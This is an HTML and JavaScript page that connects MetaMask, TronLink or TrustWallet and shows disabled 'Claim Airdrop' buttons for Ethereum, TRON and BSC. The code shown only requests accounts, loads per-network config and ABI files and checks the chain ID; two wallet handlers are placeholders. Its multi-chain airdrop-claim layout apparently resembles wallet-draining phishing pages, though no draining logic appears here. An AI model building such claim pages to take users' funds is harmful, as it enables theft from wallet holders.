<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Integration</title>
    <link rel="stylesheet" href="css/styles.css">
    <script src="https://cdn.jsdelivr.net/npm/@metamask/detect-provider/dist/detect-provider.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
</head>
<body>

<h1>Connect your Wallet</h1>
<button id="connectButton">Connect MetaMask</button>
<button id="claimAirdropButton" disabled>Claim Airdrop (ETH)</button>
<button id="connectTronlinkButton">Connect TronLink</button>
<button id="claimTronAirdropButton" disabled>Claim Airdrop (TRON)</button>
<button id="connectTrustwalletButton">Connect TrustWallet</button>
<button id="claimTrustwalletAirdropButton" disabled>Claim Airdrop (BSC)</button>

<script>
  // Function to dynamically load scripts
  function loadScript(src, callback) {
    const script = document.createElement('script');
    script.src = src;
    script.onload = callback;
    script.onerror = function(error) {
      console.error("Error loading script:", src, error); // Log error if script fails to load
    };
    document.head.appendChild(script);
  }

  // Function to load ABI and config files dynamically based on the network
  async function loadConfigAndABI(network) {
    const configMap = {
      eth: { config: 'config/eth_config.json', abi: 'abi/eth_abi.json' },
      bsc: { config: 'config/bsc_config.json', abi: 'abi/bsc_abi.json' },
      tron: { config: 'config/tron_config.json', abi: 'abi/tron_abi.json' },
    };

    const { config, abi } = configMap[network];
    try {
      const configData = await fetch(config).then((res) => res.json());
      const abiData = await fetch(abi).then((res) => res.json());
      return { config: configData, abi: abiData };
    } catch (error) {
      console.error(`Error loading config or ABI for ${network}:`, error);
      alert(`Failed to load configuration for ${network}.`);
    }
  }

  // MetaMask Connection Logic
  function connectMetaMask(config, abi, expectedChainId) {
    if (window.ethereum) {
      const web3 = new Web3(window.ethereum);
      window.ethereum.request({ method: 'eth_requestAccounts' }).then(async (accounts) => {
        console.log("Connected to MetaMask:", accounts);

        // Check if the wallet is on the correct network (Ethereum)
        const validNetwork = await checkNetwork(web3, expectedChainId);
        if (validNetwork) {
          document.getElementById('claimAirdropButton').disabled = false;
          document.getElementById('connectButton').disabled = true;
        }
      }).catch((error) => {
        console.error("MetaMask connection failed:", error);
        alert("Failed to connect to MetaMask.");
      });
    } else {
      alert("MetaMask is not installed. Please install it to continue.");
    }
  }

  // TronLink Connection Logic (Placeholder)
  function connectTronLink(config, abi, expectedChainId) {
    // Implement TronLink connection logic
    console.log('TronLink connection placeholder...');
  }

  // TrustWallet Connection Logic (Placeholder)
  function connectTrustWallet(config, abi, expectedChainId) {
    // Implement TrustWallet connection logic
    console.log('TrustWallet connection placeholder...');
  }

  // Unified Wallet Connection Handler
  function handleWalletConnection(wallet, network, expectedChainId) {
    const scriptPaths = {
      metamask: 'js/metamask.js',
      tronlink: 'js/tronlink.js',
      trustwallet: 'js/trustwallet.js',
    };

    const walletScript = scriptPaths[wallet];

    if (walletScript) {
      loadScript(walletScript, () => {
        console.log(`${walletScript} script loaded successfully.`);

        // Load config and ABI dynamically
        loadConfigAndABI(network).then(({ config, abi }) => {
          if (config && abi) {
            switch (wallet) {
              case 'metamask':
                connectMetaMask(config, abi, expectedChainId);
                break;
              case 'tronlink':
                connectTronLink(config, abi, expectedChainId);
                break;
              case 'trustwallet':
                connectTrustWallet(config, abi, expectedChainId);
                break;
            }
          }
        });
      });
    } else {
      console.error(`No script found for wallet: ${wallet}`);
    }
  }

  // Add event listeners for each button
  document.addEventListener('DOMContentLoaded', function () {
    // MetaMask Button
    document.getElementById('connectButton').addEventListener('click', function () {
      handleWalletConnection('metamask', 'eth', 1);  // Ethereum Mainnet chainId is 1
    });

    // TronLink Button
    document.getElementById('connectTronlinkButton').addEventListener('click', function () {
      handleWalletConnection('tronlink', 'tron', 1);  // Placeholder for Tron mainnet chainId
    });

    // TrustWallet Button
    document.getElementById('connectTrustwalletButton').addEventListener('click', function () {
      handleWalletConnection('trustwallet', 'bsc', 56);  // BSC chainId is 56
    });
  });

  // Check Network Function (added here)
  async function checkNetwork(web3, expectedChainId) {
    try {
        const currentChainId = await web3.eth.getChainId();
        if (currentChainId === expectedChainId) {
            return true;
        } else {
            alert(`Please switch to the correct network (Chain ID: ${expectedChainId}).`);
            return false;
        }
    } catch (error) {
        console.error("Error checking network:", error);
        return false;
    }
  }
</script>

</body>
</html>


